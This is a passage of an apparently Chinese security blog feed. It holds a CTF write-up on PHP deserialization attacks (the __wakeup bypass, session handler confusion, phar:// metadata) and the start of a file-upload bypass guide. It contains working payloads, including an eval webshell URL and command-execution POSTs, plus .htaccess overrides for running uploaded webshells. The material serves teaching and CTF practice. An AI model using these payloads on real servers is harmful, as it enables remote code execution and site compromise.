    <content type="html"><![CDATA[<h3 id="1、什么是序列化"><a href="#1、什么是序列化" class="headerlink" title="1、什么是序列化"></a>1、什么是序列化</h3><p>序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击</p><h3 id="2、序列化相关函数"><a href="#2、序列化相关函数" class="headerlink" title="2、序列化相关函数"></a>2、序列化相关函数</h3><p>serialize、unserialize，以及在序列化和反序列化过程中自动执行的魔术方法，具体有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()<span class="comment">//创建对象时触发</span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><p>经常会用到且比较重要的函数：</p><p><strong><em>__sleep()函数：</em></strong><br>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">'ID'</span>, <span class="string">'sex'</span>, <span class="string">'age'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回只需要序列化的三个属性</p><p><strong><em>__wakeup()：</em></strong><br>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><p><strong><em>__toString()：</em></strong><br>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示什么样的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如只想返回对象的info属性</p><h3 id="3、-简单案例"><a href="#3、-简单案例" class="headerlink" title="3、 简单案例"></a>3、 简单案例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerializeTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="string">"flag&#123;th15_tru3_f1a9&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">"test.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;file, <span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> SerializeTest();</span><br><span class="line">$temp = serialize($test);</span><br><span class="line"><span class="keyword">echo</span> $temp . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$me = unserialize($temp);</span><br></pre></td></tr></table></figure><p>输出：<br>O:13:”SerializeTest”:2:{s:19:” SerializeTest flag”;s:20:”flag{th15_tru3_f1a9}”;s:19:” SerializeTest file”;s:8:”test.php”;}</p><p>O: 代表对象  13代表对象所属类的字符表示</p><p>:2: 代表具有两个序列化的属性，分别是SerializeTest flag和SerializeTest file，后面的内容对应的是值</p><h3 id="4、题目实战"><a href="#4、题目实战" class="headerlink" title="4、题目实战"></a>4、题目实战</h3><h4 id="4-1-绕过-wakeup-方法"><a href="#4-1-绕过-wakeup-方法" class="headerlink" title="4.1 绕过__wakeup()方法"></a>4.1 绕过__wakeup()方法</h4><p>第一步和第二步都比较简单的可以绕过<br>关键是第三步，看关键的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'Gu3ss_m3_h2h2.php'</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'Gu3ss_m3_h2h2.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the f15g_1s_here.php </span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'Gu3ss_m3_h2h2.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"Gu3ss_m3_h2h2.php"</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一步是要绕过正则表达式的判断，preg_match(‘/[oc]:\d+:/i’, $var)，这里绕过正则的方式是在O的后面的加上+号</p><p>比如形如这样的序列化：O:+6:”sercet”:1:{s:12:” sercet file”;s:12:”the_next.php”;}</p><p>第二是要绕过__wakeup()对$file对象的赋值</p><p>问题是如何绕过__weakup 百度一下  发现这是一个CVE漏洞 ==》当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</p><p>类似这样的payload：O:+6:”sercet”:2:{s:12:” sercet file”;s:12:”the_next.php”;}</p><p><strong><em>所以构造payload:</em></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$demo = <span class="keyword">new</span> Demo(<span class="string">'f15g_1s_here.php'</span>);</span><br><span class="line">$va = serialize($demo);</span><br><span class="line">$a1 = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>, $va);</span><br><span class="line">$a1 = str_replace(<span class="string">':1:'</span>, <span class="string">':7:'</span>, $a1);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($a1);</span><br><span class="line"></span><br><span class="line">O:+<span class="number">4</span>:<span class="string">"Demo"</span>:<span class="number">2</span>:&#123;S:<span class="number">10</span>:<span class="string">"\00Demo\00file"</span>;s:<span class="number">16</span>:<span class="string">"f15g_1s_here.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>/Gu3ss_m3_h2h2.php?var=TzorNDoiRGVtbyI6Nzp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==</p><p>得到f15g_1s_here.php的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'val'</span>])) &#123; </span><br><span class="line">    $val = $_GET[<span class="string">'val'</span>]; </span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'$value="'</span> . addslashes($val) . <span class="string">'";'</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hahaha!'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="http://7fd6cef3296344adb135503e375b83210f41ea6ac1df44e8.game.ichunqiu.com//f15g_1s_here.php?val=${@eval($_POST[0])}" target="_blank" rel="noopener">http://7fd6cef3296344adb135503e375b83210f41ea6ac1df44e8.game.ichunqiu.com//f15g_1s_here.php?val=${@eval($_POST[0])}</a></p><p>POST请求：0=echo `ls`;</p><p>Gu3ss_m3_h2h2.php True_F1ag_i3_Here_233.php f15g_1s_here.php index.php</p><p>执行：<br>0=echo `cat True_F1ag_i3_Here_233.php`;</p><h4 id="4-2-session反序列化漏洞"><a href="#4-2-session反序列化漏洞" class="headerlink" title="4.2 session反序列化漏洞"></a>4.2 session反序列化漏洞</h4><p>首先我们需要了解session反序列化是什么？<br>PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化<br>在php.ini中有以下配置项，wamp的默认配置如图<br><img src="https://img-blog.csdnimg.cn/20200223213850436.png" alt="在这里插入图片描述"></p><table><thead><tr><th>配置项</th><th>说明</th></tr></thead><tbody><tr><td>session.save_path</td><td>设置session的存储路径</td></tr><tr><td>session.save_handler</td><td>设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</td></tr><tr><td>session.auto_start</td><td>指定会话模块是否在请求开始时启动一个会话,默认为0不启动</td></tr><tr><td>session.serialize_handler</td><td>定义用来序列化/反序列化的处理器名字。默认使用php</td></tr></tbody></table><table><thead><tr><th>反序列化引擎</th><th>对应的存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的ASCII字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_serialize</td><td>经过 serialize() 函数反序列处理的数组</td></tr></tbody></table><p>三种序列化引擎反序列化样例：</p><table><thead><tr><th>序列化引擎</th><th>对应的存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的ASCII字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_serialize</td><td>经过 serialize() 函数反序列处理的数组</td></tr></tbody></table><p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。<br>示例代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="number">2</span>ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line"><span class="number">3</span>session_start();</span><br><span class="line"><span class="number">4</span><span class="comment">// do something</span></span><br></pre></td></tr></table></figure><p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。<br>不同序列化引擎最终的存储结果如下，以以下代码为例进行说明：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="number">2</span>ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'XXXX指定序列化引擎'</span>);</span><br><span class="line"><span class="number">3</span>session_start();</span><br><span class="line"><span class="number">4</span>$_SESSION[<span class="string">'name'</span>] = <span class="string">'hahaha'</span>;</span><br><span class="line"><span class="number">5</span>var_dump();</span><br><span class="line"><span class="number">6</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>序列化引擎</th><th>对应的存储形式</th></tr></thead><tbody><tr><td>php</td><td>name</td></tr><tr><td>php_binary</td><td>names:6:”hahaha”；由于name的长度是4，4在ASCII表中对应的就是EOT。根据php_binary的存储规则，最后就是names:6:”hahaha”;（ASCII的值为4的字符无法在网页上面显示）</td></tr><tr><td>php_serialize</td><td>SESSION文件的内容是a:1:{s:4:”name”;s:6:”hahaha”;}。a:1是使用php_serialize进行序列化时都会加上，表示只有一个键值对。同时使用php_serialize会将session中的key和value都会进行序列化。</td></tr></tbody></table><p><strong>Session 反序列化利用点:</strong><br>PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法</p><p>假设存在s1.php和s2.php，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞、s1.php，使用php_serialize来处理session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="number">2</span>ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line"><span class="number">3</span>session_start();</span><br><span class="line"><span class="number">4</span>$_SESSION[<span class="string">"spoock"</span>]=$_GET[<span class="string">"a"</span>];</span><br><span class="line"></span><br><span class="line">us2.php,使用php来处理session</span><br><span class="line"><span class="number">1</span>ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"><span class="number">2</span>session_start();</span><br><span class="line"><span class="number">3</span><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line"><span class="number">4</span>        <span class="keyword">var</span> $hi;</span><br><span class="line"><span class="number">5</span>        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="number">6</span>                <span class="keyword">$this</span>-&gt;hi = <span class="string">'phpinfo();'</span>;</span><br><span class="line"><span class="number">7</span>        &#125;</span><br><span class="line"><span class="number">8</span>        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">9</span>                <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;hi);</span><br><span class="line"><span class="number">10</span>        &#125;</span><br><span class="line"><span class="number">11</span>&#125;</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure><p>当访问s1.php时，提交如下的数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>localhost/s1.php?a=|O:<span class="number">5</span>:<span class="string">"lemon"</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">"hi"</span>;s:<span class="number">14</span>:<span class="string">"echo "</span>spoock<span class="string">";"</span>;&#125;</span><br></pre></td></tr></table></figure><p>此时传入的数据会按照php_serialize来进行序列化。此时访问us2.php时，页面输出，spoock成功执行了我们构造的函数。因为在访问us2.php时，程序会按照php来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法。</p><p><strong>相关的CTF题</strong></p><ul><li>LCTF-2018 bestphp’s revenge</li><li><a href="https://www.anquanke.com/post/id/164569" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164569</a></li><li>安恒杯-Session反序列化</li></ul><h4 id="4-3-phar伪协议反序列化"><a href="#4-3-phar伪协议反序列化" class="headerlink" title="4.3 phar伪协议反序列化"></a>4.3 phar伪协议反序列化</h4><p>利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。</p><p><strong>phar文件结构</strong></p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>A stub</td><td>可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。</td></tr><tr><td>A manifest describing the contents</td><td>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</td></tr><tr><td>The file contents</td><td>被压缩文件的内容</td></tr><tr><td>A signature for verifying Phar integrity</td><td>签名，放在文件末尾</td></tr></tbody></table><p>生成phar文件的示例代码：（注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PharDemo</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $message;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;message = $msg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> PharDemo(<span class="string">"oh oh oh !!!"</span>);</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>生成的phar文件内容为：</p><p><img src="https://img-blog.csdnimg.cn/2020022321474443.png" alt="在这里插入图片描述"></p><p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="https://img-blog.csdnimg.cn/20200223214757564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PharDemo</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $message;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;message = $msg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = <span class="string">'phar://phar.phar/test.txt'</span>;</span><br><span class="line"><span class="comment">//file_get_contents($filename);</span></span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure><p>结果输出：oh oh oh !!! 说明成功进行了反序列化</p><p>有时候对传入的参数进行了一些过滤，把 phar:// 开头的直接 过滤了，也就是我要求你要用另外的反序列化的方式，这种方式不能使用 phar:// 开头，我们可以使用的是 compress.zlib://phar://xxxx 这种方式进行绕过过滤</p><p><strong>相关的CTF题</strong></p><ul><li>LCTF-2018 T4lk 1s ch34p,sh0w m3 the sh31l</li><li><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></li><li><a href="http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</a></li></ul><p>参考文献</p><p>【1】<a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1、什么是序列化&quot;&gt;&lt;a href=&quot;#1、什么是序列化&quot; class=&quot;headerlink&quot; title=&quot;1、什么是序列化&quot;&gt;&lt;/a&gt;1、什么是序列化&lt;/h3&gt;&lt;p&gt;序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.kaide0521.cn/categories/CTF/"/>
    
    
      <category term="php反序列化" scheme="https://blog.kaide0521.cn/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP文件上传总结</title>
    <link href="https://blog.kaide0521.cn/2019/04/12/php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/"/>
    <id>https://blog.kaide0521.cn/2019/04/12/php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/</id>
    <published>2019-04-12T13:46:37.000Z</published>
    <updated>2020-03-04T08:44:26.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="基本上传思路"><a href="#基本上传思路" class="headerlink" title="基本上传思路"></a>基本上传思路</h4><h5 id="一、前端绕过"><a href="#一、前端绕过" class="headerlink" title="一、前端绕过"></a>一、前端绕过</h5><p>特点：一般只检测文件的扩展名<br>判断方式：没有流量经过代理（Burpsuite）就可以证明为客户端JavaScript检测<br>绕过方法：</p><ul><li>配置Burpsuite代理进行抓包，再将文件名shell.jpg改为shell.php</li><li>上传页面，审查元素，修改JavaScript检测函数（firebug插件）</li></ul><h5 id="二、-基本类型绕过"><a href="#二、-基本类型绕过" class="headerlink" title="二、 基本类型绕过"></a>二、 基本类型绕过</h5><ul><li><p><strong>** MIME类型检测 **</strong>：检测content-type字段(image/gif),绕过方式：使用代理工具抓包修改Content-type的值</p></li><li><p><strong>** 大写 Multipart **</strong>：即将请求头中的 Content-Type 的 multipart/form-data 第一个字符 m 改成 M，即 Multipart/form-data（不影响传输）</p></li><li><p><strong><strong>文件内容检测</strong></strong>：检测文件幻数、相关信息<br>文件幻数检测<br><br>JPG: FF D8 FF E0 00 10 4A 46 49 46<br><br>GIF: 47 49 46 38 39 61(GIF89a)<br><br>PNG: 89 50 4E 47<br><br>绕过方法：在文件幻数后面加上自己的一句话木马<br><br>过滤了&lt;?php，可使用以下脚本绕过：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&#39;php或者PHP或者PhP...&#39;&gt;</span><br><span class="line">    phpinfo();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong><strong>文件扩展名检测</strong></strong>：检测跟文件extension相关的内容（blacklist,whitelist）<br><br>Blacklist<br><br>php、php2、hph3、php4、php5、pht、phtml、asp、ascx、jsp、bat、exe、dll等<br><br>（1） 绕过方法：<br><br>（2） 尝试未写入黑名单的后缀名<br><br>（3） IIS默认支持解析.asp、.cdx、.asa、.cer等<br><br>（4） 文件名大小写绕过：pHp<br><br>（5） Shell.php .或shell.php_  //下划线表示空格，IIS支持，Linux/Unix不支持<br><br>（6） 空字符截断：%00,0x00;char(0)</p></li></ul><ul><li><strong><strong>.htaccess文件攻击（Apache）</strong></strong><br><br>.htaccess文件：Apache服务器中的一个配置文件，负责相关的网络配置<br><br>建一个.htaccess 文件，里面的内容如下，然后上传覆盖原始.htaccess文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 上传一个文件名字叫做pino的文件，不要后缀名，然后里面是一句话木马，用菜刀连接 --&gt;</span><br><span class="line">&lt;FilesMatch &quot;pino&quot;&gt;</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!-- 上传一个文件名字叫做demo.jpg的文件，然后里面是一句话木马，用菜刀连接 --&gt;</span><br><span class="line">&lt;Files demo.jpg&gt;</span><br><span class="line">    ForceType application&#x2F;x-httpd-php</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line"> &lt;&#x2F;Files&gt;</span><br><span class="line"> 或者</span><br><span class="line"> &lt;!-- 上传一个文件名字叫做.jpg的文件，然后里面是一句话木马，用菜刀连接 --&gt;</span><br><span class="line">&lt;IfModule&gt;</span><br><span 